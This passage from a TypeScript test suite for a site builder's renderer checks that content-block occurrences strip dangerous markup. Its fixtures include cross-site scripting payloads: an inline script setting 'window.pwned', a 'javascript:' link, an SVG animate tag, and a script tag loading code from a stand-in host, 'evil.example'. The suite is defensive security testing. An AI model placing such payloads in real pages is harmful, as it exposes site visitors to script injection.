      delete (window as { pwned?: number }).pwned;
    });

    // a Content Block holds its templates list first, then its items
    const occurrence = (children: string[]): Array<[string, Instance]> => [
      instance({ id: "body", children: ids("block") }),
      instance({
        id: "block",
        component: blockComponent,
        children: ids("templates", "own"),
      }),
      instance({ id: "templates", component: blockTemplateComponent }),
      instance({
        id: "own",
        tag: "p",
        children: [{ type: "text", value: "the block's own" }],
      }),
      instance({
        id: "runtime-block",
        component: blockComponent,
        children: ids("runtime-templates", ...children),
      }),
      instance({ id: "runtime-templates", component: blockTemplateComponent }),
    ];

    const prepareOccurrence = (
      instances: Array<[string, Instance]>,
      instanceIds: string[]
    ) => {
      prepare({ instances, props: [] });
      $externalContentRoots.set(
        new Map([
          [
            "root",
            {
              sourceBlockInstanceId: "block",
              sourceRenderScope: getInstanceKey(["block", "body"]),
              blockInstanceId: "runtime-block",
              instanceIds: new Set([
                "runtime-block",
                "runtime-templates",
                ...instanceIds,
              ]),
              mutationRevision: 0,
            },
          ],
        ])
      );
      if (renderer === "canvas") {
        $builderMode.set("content");
      }
    };

    const bodyElement = () =>
      createInstanceElement({
        instances: $instances.get(),
        instanceId: "body",
        instanceSelector: ["body"],
        Component: componentOf(renderer),
        components: $registeredComponents.get(),
      });

    test("without a script, an animate or a script tag on a Box", async () => {
      const children = ["mdx-p", "mdx-script", "mdx-svg", "mdx-box"];
      prepareOccurrence(
        [
          ...occurrence(children),
          instance({
            id: "mdx-p",
            tag: "p",
            children: [{ type: "text", value: "mdx occurrence" }],
          }),
          instance({
            id: "mdx-script",
            tag: "script",
            children: [{ type: "text", value: "window.pwned=1" }],
          }),
          instance({ id: "mdx-svg", tag: "svg", children: ids("mdx-animate") }),
          instance({ id: "mdx-animate", tag: "animate" }),
          instance({ id: "mdx-box", component: "Box", tag: "script" }),
        ],
        [...children, "mdx-animate"]
      );
      const scriptsBefore = document.querySelectorAll("script").length;
      const dom = await mount(renderer, bodyElement());

      // the occurrence rendered, not the block's own children
      expect(dom.textContent).toContain("mdx occurrence");
      expect(dom.textContent).not.toContain("the block's own");
      expect(document.querySelectorAll("script").length).toBe(scriptsBefore);
      expect(dom.querySelector("animate")).toBeNull();
      expect(dom.querySelector('[data-ws-id="mdx-script"]')?.tagName).toBe(
        "DIV"
      );
      expect(dom.querySelector('[data-ws-id="mdx-box"]')?.tagName).toBe("DIV");
      expect((window as { pwned?: number }).pwned).toBeUndefined();
    });

    // 0.309.0 computes no props for an occurrence's instances (the walk
    // follows instance.children from the page root, and the runtime block is
    // nobody's child), so the values are seeded here. They stand in for any
    // path that computes them, as a later upstream change may.
    test("without an unsafe address, a raw embed or a script tag prop, from the props the occurrence is given", async () => {
      const children = ["mdx-link", "mdx-ok", "mdx-embed", "mdx-box"];
      prepareOccurrence(
        [
          ...occurrence(children),
          instance({
            id: "mdx-link",
            tag: "a",
            children: [{ type: "text", value: "unsafe" }],
          }),
          instance({
            id: "mdx-ok",
            tag: "a",
            children: [{ type: "text", value: "safe" }],
          }),
          instance({ id: "mdx-embed", component: "HtmlEmbed" }),
          instance({ id: "mdx-box", component: "Box" }),
        ],
        children
      );
      await settleProps();
      const seeded = new Map($propValuesByInstanceSelector.get());
      const at = (id: string) => getInstanceKey([id, "runtime-block", "body"]);
      seeded.set(
        at("mdx-link"),
        new Map([["href", "javascript:window.pwned=1"]])
      );
      seeded.set(at("mdx-ok"), new Map([["href", "https://ok.example/"]]));
      seeded.set(at("mdx-embed"), new Map([["code", html]]));
      seeded.set(
        at("mdx-box"),
        new Map<string, unknown>([
          ["data-ws-tag", "script"],
          ["async", true],
          ["src", `https://evil.example/mdx-${renderer}.js`],
        ])
      );
      $propValuesByInstanceSelector.set(seeded);
      const dom = mountNow(renderer, bodyElement());

      // the control: the seeded props reach the occurrence's instances
      expect(dom.querySelector('a[href="https://ok.example/"]')).not.toBeNull();
      expect(dom.querySelector('a[href^="javascript:"]')).toBeNull();
      expect(dom.textContent).toContain("HTML Embed is paused");
      expect(dom.querySelector("#pwn")).toBeNull();
      expect(evilScripts().length).toBe(0);
      expect(dom.querySelector('[data-ws-id="mdx-box"]')?.tagName).toBe("DIV");
      expect((window as { pwned?: number }).pwned).toBeUndefined();
    });
  }
);
